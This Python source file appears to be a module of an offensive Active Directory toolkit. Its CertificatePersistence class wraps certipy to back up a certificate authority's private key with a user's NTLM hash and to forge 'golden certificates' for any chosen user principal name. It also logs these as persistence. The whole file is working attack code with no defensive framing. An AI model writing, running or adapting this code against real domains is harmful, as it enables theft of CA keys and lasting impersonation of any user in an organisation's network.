"""
Implementation of certificate-based persistence mechanisms.
Uses certipy for CA backup and golden certificate creation.
"""

from .persistence_base import PersistenceBase
from .sid_enum import SIDEnumeration
from typing import Optional, Dict
import subprocess
import os

class CertificatePersistence(PersistenceBase):
    def __init__(self):
        """Initialize certificate persistence module"""
        super().__init__()
        self.sid_enum = SIDEnumeration()
        
    def backup_ca(self, domain: str, dc_ip: str, username: str, 
                 hash: str, ca_name: str) -> bool:
        """
        Backup CA private key using certipy
        
        Args:
            domain: Domain name
            dc_ip: Domain Controller IP
            username: Username with CA admin rights
            hash: NTLM hash for authentication
            ca_name: Name of the CA to backup
            
        Returns:
            bool indicating success/failure
        """
        try:
            # First get domain SID for logging
            domain_sid = self.sid_enum.get_stored_sid(domain)
            if not domain_sid:
                self.log_status(f"Domain SID not found in database, attempting enumeration")
                domain_sid = self.sid_enum.enumerate_domain_sid(domain, dc_ip)
            
            # Backup CA using certipy
            cmd = [
                'certipy',
                'ca',
                '-backup',
                '-ca', ca_name,
                '-username', f'{username}@{domain}',
                '-hashes', hash
            ]
            
            self.log_status(f"Backing up CA: {ca_name}")
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if "Successfully backed up" in result.stdout:
                pfx_file = f"{ca_name}.pfx"
                self.log_success(f"CA backup successful: {pfx_file}")
                
                # Log persistence with domain SID if available
                persistence_data = {
                    'ca_name': ca_name,
                    'domain': domain,
                    'backup_file': pfx_file
                }
                if domain_sid:
                    persistence_data['domain_sid'] = domain_sid
                    
                self.log_persistence('ca_backup', persistence_data)
                return True
                
            self.log_error("Failed to backup CA")
            return False
            
        except Exception as e:
            self.log_error(f"CA backup failed: {str(e)}")
            return False
            
    def create_golden_certificate(self, domain: str, dc_ip: str,
                                ca_pfx: str, upn: str,
                                subject: str) -> bool:
        """
        Create golden certificate using backed up CA
        
        Args:
            domain: Domain name
            dc_ip: Domain Controller IP
            ca_pfx: Path to CA backup file
            upn: User Principal Name for certificate
            subject: Certificate subject
            
        Returns:
            bool indicating success/failure
        """
        try:
            # First get domain SID for logging
            domain_sid = self.sid_enum.get_stored_sid(domain)
            if not domain_sid:
                self.log_status(f"Domain SID not found in database, attempting enumeration")
                domain_sid = self.sid_enum.enumerate_domain_sid(domain, dc_ip)
            
            # Create golden certificate using certipy
            cmd = [
                'certipy',
                'forge',
                '-ca-pfx', ca_pfx,
                '-upn', upn,
                '-subject', subject
            ]
            
            self.log_status(f"Creating golden certificate for {upn}")
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if "Successfully forged" in result.stdout:
                cert_file = f"{upn.split('@')[0]}.pfx"
                self.log_success(f"Golden certificate created: {cert_file}")
                
                # Log persistence with domain SID if available
                persistence_data = {
                    'upn': upn,
                    'subject': subject,
                    'cert_file': cert_file,
                    'domain': domain
                }
                if domain_sid:
                    persistence_data['domain_sid'] = domain_sid
                    
                self.log_persistence('golden_cert', persistence_data)
                return True
                
            self.log_error("Failed to create golden certificate")
            return False
            
        except Exception as e:
            self.log_error(f"Golden certificate creation failed: {str(e)}")
            return False
            
    def check_certificate_validity(self, cert_path: str) -> Dict:
        """
        Check validity of a certificate
        
        Args:
            cert_path: Path to certificate file
            
        Returns:
            Dict containing certificate information
        """
        try:
            # Check certificate using certipy
            cmd = [
                'certipy',
                'cert',
                '-pfx', cert_path,
                '-info'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            info = {}
            if "Certificate Information" in result.stdout:
                # Parse certificate information
                for line in result.stdout.splitlines():
                    if ': ' in line:
                        key, value = line.split(': ', 1)
                        info[key.strip()] = value.strip()
                        
                return info
            
            return {'error': 'Failed to read certificate information'}
            
        except Exception as e:
            self.log_error(f"Certificate check failed: {str(e)}")
            return {'error': str(e)} 